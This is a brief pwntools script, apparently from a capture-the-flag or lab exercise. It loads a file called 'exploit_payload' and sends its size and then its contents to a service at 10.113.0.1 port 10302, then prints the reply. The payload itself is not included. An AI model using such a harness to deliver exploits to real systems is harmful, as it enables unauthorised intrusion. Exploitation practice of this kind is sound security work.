from pwn import *

context.log_level = 'debug'

with open("exploit_payload", "rb") as f:
    payload = f.read()

print(f"[*] Payload size: {len(payload)}")
print(f"[*] Connecting to server...")

r = remote("10.113.0.1", 10302)

print(f"[*] Waiting for prompt...")
r.recvuntil(b"size > ")

print(f"[*] Sending size: {len(payload)}")
r.sendline(str(len(payload)).encode())

print(f"[*] Sending payload...")
r.send(payload)

print(f"[*] Waiting for response...")
try:
    response = r.recvall(timeout=5)
    print(response.decode('utf-8', errors='ignore'))
except:
    print("[!] No response or timeout")

r.close()